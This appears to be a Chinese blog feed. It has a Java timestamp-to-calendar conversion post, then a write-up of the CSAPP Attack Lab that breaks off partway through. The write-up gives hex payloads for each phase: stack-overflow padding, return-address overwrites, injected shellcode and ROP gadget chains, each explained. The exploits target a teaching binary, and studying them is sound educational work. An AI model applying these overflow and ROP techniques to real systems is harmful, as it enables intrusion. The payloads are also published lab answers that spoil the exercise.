class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hour;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> minute;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> second;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerSecond = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerMinute = <span class="number">1000</span>*<span class="number">60</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerHour = <span class="number">3600</span>*<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerDay = <span class="number">24</span>*<span class="number">3600</span>*<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerPingNian = <span class="number">365</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerLeapYear = <span class="number">366</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeOf1970And1971 = timePerPingNian+timePerPingNian;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePer4Year = (<span class="keyword">long</span>)(<span class="number">365.25</span>*<span class="number">4</span>*timePerDay);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeEvery400Year = timePer4Year*<span class="number">100</span> - <span class="number">3</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeOf1970To2000 = timePer4Year*<span class="number">7</span>+timeOf1970And1971;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] daysPerMonth = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setMinuteAndSecond</span><span class="params">(<span class="keyword">long</span> milliTime)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> milliTime&lt;timePerDay;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&gt;=timePerDay)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        hour = (<span class="keyword">int</span>)(milliTime/timePerHour);</span><br><span class="line">        <span class="keyword">long</span> t = milliTime%timePerHour;</span><br><span class="line">        minute = (<span class="keyword">int</span>)(t/timePerMinute);</span><br><span class="line">        t = t%timePerMinute;</span><br><span class="line">        second = (<span class="keyword">int</span>)(t/timePerSecond);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setMonthAndDay</span><span class="params">(<span class="keyword">long</span> milliTime, <span class="keyword">boolean</span> isLeapYear)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//this func should handle  the case where milliTime == 0;</span></span><br><span class="line">        <span class="comment">//this func get the milliseconds within 1 year;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        daysPerMonth[<span class="number">1</span>] = isLeapYear ? <span class="number">29</span> : <span class="number">28</span>; <span class="comment">//set the days of February;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> cnt = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            milliTime -= daysPerMonth[++cnt]*timePerDay;</span><br><span class="line">        &#125;<span class="keyword">while</span> (milliTime&gt;=<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        month = cnt+<span class="number">1</span>;  <span class="comment">//for that the cnt begin from 0, but month begin from 1;</span></span><br><span class="line">        <span class="keyword">long</span> timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;</span><br><span class="line">        day = (<span class="keyword">int</span>)(timeOfLastMonth/timePerDay)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        setMinuteAndSecond(timeOfLastMonth % timePerDay);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setDataFile</span><span class="params">(<span class="keyword">long</span> milliTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> is1970Or1971 = milliTime&lt;timeOf1970And1971 ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> is20Century = milliTime&lt;timeOf1970To2000 ? <span class="keyword">true</span>: <span class="keyword">false</span>; </span><br><span class="line">       <span class="comment">//if equal is 2000 1 1 0:0:0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is1970Or1971) &#123;</span><br><span class="line">            year = milliTime&gt;=timePerPingNian ? <span class="number">1971</span> : <span class="number">1970</span>;</span><br><span class="line">            setMonthAndDay(year==<span class="number">1971</span> ? milliTime-timePerPingNian : milliTime, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is20Century) &#123;</span><br><span class="line">            <span class="keyword">long</span> t = (milliTime-timeOf1970And1971)/timePer4Year;  </span><br><span class="line">            <span class="keyword">long</span> t1 = milliTime-timeOf1970And1971-t*timePer4Year;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> t2 = t1-timePerLeapYear;</span><br><span class="line">            <span class="keyword">boolean</span> isLeapYear = t2&lt;<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">long</span> t3 = isLeapYear ? <span class="number">0</span> : t2/timePerPingNian+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            year = (<span class="keyword">int</span>)(<span class="number">1972</span>+t*<span class="number">4</span>+t3);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);</span><br><span class="line">            setMonthAndDay(l, isLeapYear);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> p = milliTime-timeOf1970To2000;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t1 = p/timeEvery400Year;</span><br><span class="line">        <span class="keyword">long</span> p1 = p-t1*timeEvery400Year;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t2 = p1/timePer4Year;</span><br><span class="line">        <span class="keyword">long</span> tN = t2/<span class="number">25</span>;    </span><br><span class="line">      <span class="comment">//in every 400 years, other year such as xy00(y!=0) is not leap year;</span></span><br><span class="line">        </span><br><span class="line">      <span class="keyword">long</span> p2 = p1-t2*timePer4Year;</span><br><span class="line">        p2 += tN*timePerDay;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t3 = p2-timePerLeapYear;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isLeapYear = t3&lt;<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> t4 = isLeapYear ? <span class="number">0</span> : t3/timePerPingNian+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        year = (<span class="keyword">int</span>)(<span class="number">2000</span>+t1*<span class="number">400</span>+t2*<span class="number">4</span>+t4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);</span><br><span class="line">        setMonthAndDay(lt, isLeapYear);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="设置时分秒（函数setMinuteAndSecond）"><a href="#设置时分秒（函数setMinuteAndSecond）" class="headerlink" title="设置时分秒（函数setMinuteAndSecond）"></a>设置时分秒（函数setMinuteAndSecond）</h4><ul><li>函数的输入是 小于 每天毫秒数  的一个整数</li><li>因为是从0:0:0开始计时，所以很好算</li><li>直接除以每小时毫秒数，结果就是 要求的小时数</li><li>然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数</li><li>以此类推，算出秒数</li></ul><h4 id="设置月和日（函数setMonthAndDay）"><a href="#设置月和日（函数setMonthAndDay）" class="headerlink" title="设置月和日（函数setMonthAndDay）"></a>设置月和日（函数setMonthAndDay）</h4><ul><li>函数的输入为  小于  每年毫秒数  一个整数</li><li>依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。<strong>注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59</strong></li><li>通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）</li></ul><h4 id="设置年份（在函数setDataFile中）"><a href="#设置年份（在函数setDataFile中）" class="headerlink" title="设置年份（在函数setDataFile中）"></a>设置年份（在函数setDataFile中）</h4><ul><li><p>对1970/1971特殊处理，直接判断是否毫秒数是否 $\geq$ 一个平年的毫秒数，如果是，那么就是1971。<strong>注意，等于也是，原因如上所述。</strong>然后调用setMonthAndDay函数，设置日月</p></li><li><p>对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。</p><p>然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$</p></li><li><p>然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$</p><p>接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$</p><p>接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$</p><p>接下来调用setMonthAndDay函数设置月份日期</p></li></ul>]]></content>
    
    <summary type="html">
    
      从时间戳（毫秒）计算日历
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://h-zex.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="时间戳" scheme="https://h-zex.github.io/tags/%E6%97%B6%E9%97%B4%E6%88%B3/"/>
    
      <category term="日历" scheme="https://h-zex.github.io/tags/%E6%97%A5%E5%8E%86/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="https://h-zex.github.io/2017/09/16/CSAPP-Attack-Lab/"/>
    <id>https://h-zex.github.io/2017/09/16/CSAPP-Attack-Lab/</id>
    <published>2017-09-16T05:18:56.000Z</published>
    <updated>2019-07-02T15:43:51.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-Attack-Lab"><a href="#CSAPP-Attack-Lab" class="headerlink" title="CSAPP Attack Lab"></a>CSAPP Attack Lab</h1><blockquote><p>本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符</p></blockquote><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five lines fill the buf */</span></span><br><span class="line"></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch1's addr */</span></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上<code>touch1</code>的地址（直接用十六进制写），然后用<code>hex2raw</code>转换后输入即可AC</li></ul><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch2的地址 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">30</span></span><br><span class="line"><span class="comment">/* sub  $0x30, %rsp */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> </span><br><span class="line"><span class="comment">/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/</span></span><br><span class="line"></span><br><span class="line">c3 <span class="comment">/* retq */</span></span><br><span class="line"></span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa  aa aa aa aa </span><br><span class="line">aa aa aa aa </span><br><span class="line"><span class="comment">/* 填充的字符串 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">80</span> dc <span class="number">61</span> <span class="number">55</span></span><br><span class="line"><span class="comment">/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */</span></span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置</li><li>需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址</li></ul><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch3 addr, in 0x5561dc78 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">30</span> </span><br><span class="line"><span class="comment">/* sub $0x30,%rsp, in 0x5561dc80 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> c7 c7 <span class="number">90</span> dc <span class="number">61</span> <span class="number">55</span> </span><br><span class="line"><span class="comment">/* mov  $0x5561dc90,%rdi */</span></span><br><span class="line"></span><br><span class="line">c3 </span><br><span class="line"><span class="comment">/* retq will ret to 0x5561dc78 */</span>   </span><br><span class="line"></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/*fill the extra space */</span></span><br><span class="line"></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span><span class="number">00</span></span><br><span class="line"><span class="comment">/* string "59b997fa" ，in 0x5561dc90 */</span></span><br><span class="line"></span><br><span class="line">aa aa aa aa aa aa aa </span><br><span class="line"><span class="comment">/* fill the extra space */</span> </span><br><span class="line"></span><br><span class="line"><span class="number">80</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* 0x5561dc80, our code's begin addr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* just before our attack code is run, </span></span><br><span class="line"><span class="comment">* rsp == 0x5561dca0 </span></span><br><span class="line"><span class="comment">* return addr in 0x5561dca0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ul><li>比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串</li><li>然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80</li><li>接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶</li></ul><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five line fill the buf */</span></span><br><span class="line"></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x4019cc pop %rax; nop; ret */</span></span><br><span class="line"></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x59b997fa */</span></span><br><span class="line"></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x4019a2 movq %rax, %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* touch2 0x4017ec */</span></span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ul><li>构造rop链，在0x4019ca处有<code>b8 29 58 90 c3 mov $0xc3905829,%eax</code>，观察字节码，在0x4019cc处的<code>58</code>是<code>pop rax</code>，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax</li><li>在0x4019a0有<code>8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax</code>，观察字节码，0x4019a2处有<code>48 89 c7</code>，也就是<code>mov %rax, %rdi</code>，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了</li></ul><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five lines fill space of buf */</span></span><br><span class="line"></span><br><span class="line"><span class="number">17</span> <span class="number">2b</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* 402b17, pop rsi,ret to this, assume that rsp is K */</span></span><br><span class="line"></span><br><span class="line"><span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* the data pop to rsi */</span></span><br><span class="line"></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* the data are pop to r15 */</span></span><br><span class="line"><span class="comment">/* after all pop, rsp is K+16 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */</span></span><br><span class="line"></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019a2, movq rax, rdi */</span></span><br><span class="line"></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */</span></span><br><span class="line"></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019c5, mov rax, rdi */</span></span><br><span class="line"></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4018fa touch3 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x59b997fa in here */</span></span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ul><li><p>把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后</p></li><li><p>用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的<code>lea (%rdi,%rsi,1),%rax</code>符合要求</p></li><li><p>为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到<code>pop %r14</code>，该指令第二个字节<code>5e</code>是<code>pop %rsi</code>，因为该指令跟ret之间还有<code>pop %r15</code>，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。</p><blockquote><p>r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）</p></blockquote></li><li><p>之后用多个mov，实现rsp 